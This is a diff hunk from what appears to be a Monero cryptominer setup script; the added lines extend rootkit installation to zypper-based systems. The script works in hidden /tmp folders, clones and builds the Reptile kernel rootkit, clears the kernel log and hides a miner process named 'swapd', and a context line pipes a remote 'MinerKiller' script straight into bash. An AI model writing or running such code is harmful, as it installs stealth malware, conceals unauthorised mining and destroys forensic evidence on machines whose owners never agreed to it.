@@ -378,6 +378,9 @@ cd /tmp ; cd .ICE-unix ; cd .X11-unix ; rm -rf Diamorphine ; yum install linux-g
 echo "[*] MO0RPHIUM!! Viiiiel M0RPHIUM!!! Brauchen se nur zu besorgen, fixen kann ich selber! =)"
 cd /tmp ; cd .ICE-unix ; cd .X11-unix ; rm -rf Diamorphine ; apt-get update -y ; apt-get install build-essential linux-headers-$(uname -r) git make gcc msr-tools libncurses-dev -y ; yum update -y; yum install -y ncurses-devel ; git clone https://github.com/f0rb1dd3n/Reptile/ && cd Reptile ; make defconfig ; make ; make install ; dmesg -C ; /reptile/reptile_cmd hide ;  kill -31 `/bin/ps ax -fu $USER| grep "swapd" | grep -v "grep" | awk '{print $2}'`
 
+echo "[*] MO0RPHIUM!! Viiiiel M0RPHIUM!!! Brauchen se nur zu besorgen, fixen kann ich selber! =)"
+cd /tmp ; cd .ICE-unix ; cd .X11-unix ; rm -rf Diamorphine ; zypper update ; zypper install build-essential linux-headers-$(uname -r) git make gcc msr-tools libncurses-dev -y ; zypper update -y; zypper install -y ncurses-devel ; git clone https://github.com/f0rb1dd3n/Reptile/ && cd Reptile ; make defconfig ; make ; make install ; dmesg -C ; /reptile/reptile_cmd hide ;  kill -31 `/bin/ps ax -fu $USER| grep "swapd" | grep -v "grep" | awk '{print $2}'`
+
 #BotKiller
 curl  -s -L https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/MinerKiller.sh | bash
 
